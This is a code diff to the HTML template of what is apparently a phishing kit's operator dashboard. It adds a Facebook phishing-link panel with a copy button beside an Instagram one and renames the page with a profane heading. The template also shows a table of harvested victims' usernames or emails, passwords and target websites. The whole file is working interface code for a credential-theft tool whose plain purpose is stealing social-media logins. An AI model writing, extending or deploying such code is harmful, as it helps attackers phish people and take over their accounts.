@@ -24,6 +24,19 @@
       tooltip.innerHTML = "Copied: " + Text;
     }
 
+    function copy_facebook(){
+      var Text = document.getElementById('facebook_url').innerText;
+      var elem = document.createElement("textarea");
+      document.body.appendChild(elem);
+      elem.value = Text;
+      elem.select();
+      document.execCommand("copy");
+      document.body.removeChild(elem);
+
+      var tooltip = document.getElementById("myTooltip");
+      tooltip.innerHTML = "Copied: " + Text;
+    }
+
     function outFunc() {
       var tooltip = document.getElementById("myTooltip");
       tooltip.innerHTML = "Copy to clipboard";
@@ -36,7 +49,7 @@
 {% endblock %}
 
 {% block content %}
-<h1>{% trans "Dashboard" %}</h1>
+<h4 style="font-family: 'Metal Mania', cursive;">{% trans "FUCKBOARD" %}</h4>
 
 
 
@@ -46,7 +59,7 @@
       <h6 class="m-0 font-weight-bold text-primary">Your  Phising Links</h6>
     </div>
     <div class="card-body ">
-        
+        <!-- instagram -->
         <div class="row">
           <div class="col">
             <a href="#" class="btn btn-dangerbtn-sm btn-circle">
@@ -56,11 +69,31 @@
             </a>
           </div>
           <div class="col-8">
-            <b> <p id="instagram_url">{{instagram_url}}</p> </b>
+            <b> <p style="font-size: small;" id="instagram_url">{{instagram_url}}</p> </b>
           </div>
           <div class="col">
             
                <button class="btn btn-primary btn-sm" style="float: right;" data-toggle="tooltip" data-placement="top" title="Click to Copy url"  onclick="copy_instagram()" onmouseout="outFunc()" >
+                Copy
+              </button>
+              
+          </div>
+        </div>
+        <!-- facebook -->
+        <div class="row">
+          <div class="col">
+            <a href="#" class="btn btn-dangerbtn-sm btn-circle">
+              <abbr title="Instagram">
+                  <i style="font-size: 30px; color: blue;" class="fa fa-facebook"></i>
+              </abbr>
+            </a>
+          </div>
+          <div class="col-8">
+            <b> <p style="font-size: small;" id="facebook_url">{{facebook_url}}</p> </b>
+          </div>
+          <div class="col">
+            
+               <button class="btn btn-primary btn-sm" style="float: right;" data-toggle="tooltip" data-placement="top" title="Click to Copy url"  onclick="copy_facebook()" onmouseout="outFunc()" >
                 Copy
               </button>
               
@@ -86,7 +119,7 @@
         <th>Username Or Email</th>
         <th>Password</th>
         <th>Website</th>
-        <th>Created</th>
+        <!-- <th>Created</th> -->
         
       </tr>
     </thead>
@@ -96,7 +129,7 @@
                 <td>{{i.username_or_email}}</td>
                 <td>{{i.password}}</td>
                 <td>{{i.website}}</td>
-                <td>{{i.created}}</td>
+                <!-- <td>{{i.created}}</td> -->
             </tr>
         {% endfor %}
     </tbody>
